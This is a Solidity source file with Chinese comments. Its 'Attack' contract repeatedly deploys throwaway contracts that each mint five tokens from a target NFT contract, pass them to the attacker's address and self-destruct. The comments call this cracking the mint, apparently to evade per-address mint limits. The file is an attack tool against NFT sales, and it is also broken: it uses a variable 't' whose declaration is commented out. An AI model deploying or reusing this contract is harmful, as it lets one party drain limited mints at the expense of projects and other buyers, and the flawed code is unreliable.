// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

interface IERC721{
    // 合约里需要获得可以获得代币总量、铸造以及转移（转移给归集地址）
    function totalSupply() external view returns (uint256);
    function safeMint(uint i) external payable;
    function transferFrom(
    address from,
    address to,
    uint tokenId
    ) external;

    
}

contract ERC721Mint{
    event print(bool);
    constructor(address NFT,address owner){
       emit print(payable(msg.sender)==msg.sender);
        // require(payable(msg.sender)==msg.sender,"ooo");
        // uint t=IERC721(NFT).totalSupply();
        IERC721(NFT).safeMint(5);
        for(uint i=0;i<5;i++){
            IERC721(NFT).transferFrom(address(this),owner,t+i+1);
            // 这里的this指的是新创建的合约地址
        }
            // 自毁(收款地址,归集地址)
        selfdestruct(payable(owner));
    }
}

contract Attack{
    address public owner;
    constructor(){
        owner=msg.sender;
        // 谁approve这个合约，谁就获取NFT
    }
    function getNft(address NFT, uint8 count ) public{
        // count 表示一共进行多少回获取NFT
        // NFT 表示NFT的合约地址
        for(uint8 i=0;i<count;i++){
           new ERC721Mint(NFT,owner);
        // 不断创建新合约地址，随后去获取NFT，从而破解
        }
    }

}